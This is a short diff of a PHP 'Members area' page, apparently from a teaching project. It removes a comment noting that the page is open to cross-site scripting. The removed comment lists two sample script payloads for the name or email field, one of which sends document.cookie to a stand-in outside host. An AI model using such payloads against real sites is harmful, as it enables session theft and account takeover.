@@ -1,18 +1,7 @@
 <?php
-/*
-This page is vulnerable to a cross-side scripting attack
-
-try typing the following into the name or email field:
-
-1. <script>location.href='http://bbc.co.uk'</script>
-
-2. <script>myLoc = 'http://madeupuni.ac.uk?' + document.cookie; location.href=myLoc</script>
-*/ ?>
-<?php
 session_start();
 require_once "../pdo.php";
 require '../templates/project_header.php';
-require '../templates/project_footer.php';
 require '../functions/userauthorisation.php';
 title_bar("Members area");
 
